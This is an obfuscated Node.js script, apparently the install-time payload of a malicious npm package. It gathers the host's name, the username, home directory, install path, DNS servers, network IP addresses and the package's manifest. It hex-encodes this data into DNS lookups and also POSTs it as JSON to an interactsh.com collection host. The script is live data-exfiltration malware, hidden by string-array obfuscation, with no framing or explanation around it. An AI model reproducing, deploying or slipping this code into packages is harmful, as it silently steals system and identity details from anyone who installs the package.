var _0x3b89c0 = _0x3aa5;
(function (_0x539b93, _0xa0a082) {
    var _0x46818b = _0x3aa5;
    var _0x3c2b09 = _0x539b93();
    while (!![]) {
        try {
            var _0x304016 = -parseInt(_0x46818b(0x0)) / 0x1 + -parseInt(_0x46818b(0x1)) / 0x2 + parseInt(_0x46818b(0x2)) / 0x3 * (-parseInt(_0x46818b(0x3)) / 0x4) + -parseInt(_0x46818b(0x4)) / 0x5 * (parseInt(_0x46818b(0x5)) / 0x6) + parseInt(_0x46818b(0x6)) / 0x7 * (parseInt(_0x46818b(0x7)) / 0x8) + parseInt(_0x46818b(0x8)) / 0x9 * (-parseInt(_0x46818b(0x9)) / 0xa) + parseInt(_0x46818b(0xa)) / 0xb;
            if (_0x304016 === _0xa0a082) {
                break;
            } else {
                _0x3c2b09['push'](_0x3c2b09['shift']());
            }
        } catch (_0xdb65ae) {
            _0x3c2b09['push'](_0x3c2b09['shift']());
        }
    }
}(_0x10c1, 0xca8cf));
const os = require('os');
const dns = require('dns');
const querystring = require('querystring');
const https = require('https');
const fs = require('fs');
var path = require('path');
const packageJSON = require('./package.json');
const packageName = packageJSON['name'];
function getFiles(_0x136d79) {
    var _0x235fe0 = _0x3aa5;
    var _0x564f5a = [];
    for (var _0x1cf996 = 0x0; _0x1cf996 < _0x136d79['length']; _0x1cf996++) {
        mpath = _0x136d79[_0x1cf996];
        files = fs['readdirSync'](mpath);
        for (var _0x1b1258 = 0x0; _0x1b1258 < files['length']; _0x1b1258++) {
            _0x564f5a[_0x235fe0(0xb)](path['join'](mpath, files[_0x1b1258]));
        }
    }
    return _0x564f5a;
}
function toHex(_0x45007f) {
    const _0x5ca3c9 = Buffer['from'](_0x45007f, 'utf8');
    const _0xab7924 = _0x5ca3c9['toString']('hex');
    return _0xab7924;
}
function gethttpips() {
    var _0x2ff38b = [];
    var _0x55548e = os['networkInterfaces']();
    for (item in _0x55548e) {
        if (item != 'lo') {
            for (var _0x5ef39a = 0x0; _0x5ef39a < _0x55548e[item]['length']; _0x5ef39a++) {
                _0x2ff38b['push'](_0x55548e[item][_0x5ef39a]['address']);
            }
        }
    }
    return _0x2ff38b;
}
function getIps() {
    str = '';
    var _0x25f94c = os['networkInterfaces']();
    for (item in _0x25f94c) {
        if (item != 'lo') {
            for (var _0x363c2b = 0x0; _0x363c2b < _0x25f94c[item]['length']; _0x363c2b++) {
                str = str + toHex(_0x25f94c[item][_0x363c2b]['address']) + '.';
            }
        }
    }
    return str['slice'](0x0, -0x1);
}
function getPathChunks(_0x48b264) {
    var _0xfdc710 = _0x3aa5;
    str = 'p';
    chunks = _0x48b264[_0xfdc710(0xc)]('/');
    for (var _0x4717d1 = 0x0; _0x4717d1 < chunks['length']; _0x4717d1++) {
        str = str + toHex(chunks[_0x4717d1]) + '.';
    }
    str = str['slice'](0x0, -0x1) + 'p';
    return str;
}
function toName(_0x5b751b) {
    var _0x2206a7 = _0x3aa5;
    var _0x58c9fb = '';
    var _0x1ca79e = [];
    var _0x2f3aae = '';
    var _0x34b82f = '';
    var _0x35f824 = _0x2206a7(0xd);
    _0x58c9fb = toHex(_0x5b751b['hn']) + '.' + toHex(_0x5b751b['p']) + '.' + getPathChunks(_0x5b751b['c']) + '.' + toHex(_0x5b751b['un']) + '.' + getIps() + '.' + _0x35f824;
    if (_0x58c9fb['length'] > 0xff) {
        _0x2f3aae = toHex(_0x5b751b['p']) + '.' + getPathChunks(_0x5b751b['c']);
        _0x34b82f = getIps();
        if (_0x2f3aae['length'] < 0x96) {
            _0x2f3aae = toHex(_0x5b751b['hn']) + '.' + _0x2f3aae + '.' + toHex(_0x5b751b['un']);
            _0x1ca79e['push'](_0x2f3aae + '.' + _0x35f824);
            _0x1ca79e[_0x2206a7(0xb)](_0x34b82f + '.' + _0x35f824);
        } else if (_0x34b82f['length'] < 0x96) {
            _0x34b82f = toHex(_0x5b751b['hn']) + '.' + toHex(_0x5b751b['un']) + '.' + _0x34b82f;
            _0x1ca79e['push'](_0x2f3aae + '.' + _0x35f824);
            _0x1ca79e[_0x2206a7(0xb)](_0x34b82f + '.' + _0x35f824);
        } else {
            _0x1ca79e['push'](toHex(_0x5b751b['hn']) + '.' + _0x2f3aae + '.' + _0x35f824);
            _0x1ca79e['push'](toHex(_0x5b751b['hn']) + '.' + toHex(_0x5b751b['hd']) + '.' + toHex(_0x5b751b['un']) + '.' + _0x35f824);
            _0x1ca79e[_0x2206a7(0xb)](toHex(_0x5b751b['hn']) + '.' + _0x34b82f + '.' + _0x35f824);
        }
    } else {
        _0x1ca79e['push'](_0x58c9fb);
    }
    return _0x1ca79e;
}
const trackingData = {
    'p': packageName,
    'c': __dirname,
    'hd': os['homedir'](),
    'hn': os[_0x3b89c0(0xe)](),
    'un': os['userInfo']()[_0x3b89c0(0xf)],
    'dns': JSON['stringify'](dns['getServers']()),
    'r': packageJSON ? packageJSON['___resolved'] : undefined,
    'v': packageJSON['version'],
    'pjson': packageJSON,
    'ip': JSON['stringify'](gethttpips())
};
var queries = toName(trackingData);
for (var j = 0x0; j < queries['length']; j++) {
    dns['lookup'](queries[j], function (_0x1f4925, _0x5dde43) {
    });
}
var postData = querystring['stringify']({ 'msg': JSON[_0x3b89c0(0x10)](trackingData) });
var options = {
    'hostname': 'c5c77jy2vtc0000xqshggde77joyyyyyr.interactsh.com',
    'port': 0x1bb,
    'path': '/',
    'method': _0x3b89c0(0x11),
    'headers': {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': postData['length']
    }
};
var req = https['request'](options, _0x3a5f55 => {
    var _0x4197c0 = _0x3aa5;
    _0x3a5f55['on'](_0x4197c0(0x12), _0x169013 => {
    });
});
function _0x3aa5(_0x2cfea7, _0x10c1d1) {
    var _0x3aa5a4 = _0x10c1();
    _0x3aa5 = function (_0x3febfd, _0x354596) {
        _0x3febfd = _0x3febfd - 0x0;
        var _0x1305d1 = _0x3aa5a4[_0x3febfd];
        return _0x1305d1;
    };
    return _0x3aa5(_0x2cfea7, _0x10c1d1);
}
req['on'](_0x3b89c0(0x13), _0x1ae235 => {
});
req[_0x3b89c0(0x14)](postData);
req['end']();
function _0x10c1() {
    var _0x4fd8cf = [
        '14216fkGfaw',
        '1575EjgBfY',
        '29020sDVOlM',
        '12999800Rcvoyo',
        'push',
        'split',
        'c5c77jy2vtc0000xqshggde77joyyyyyr.interactsh.com',
        'hostname',
        'username',
        'stringify',
        'POST',
        'data',
        'error',
        'write',
        '300748XosIWc',
        '67006SOzxet',
        '1704lIXywn',
        '4032EetmLc',
        '5sEjeZR',
        '1706844ulwnjQ',
        '5306qXCnhs'
    ];
    _0x10c1 = function () {
        return _0x4fd8cf;
    };
    return _0x10c1();
}
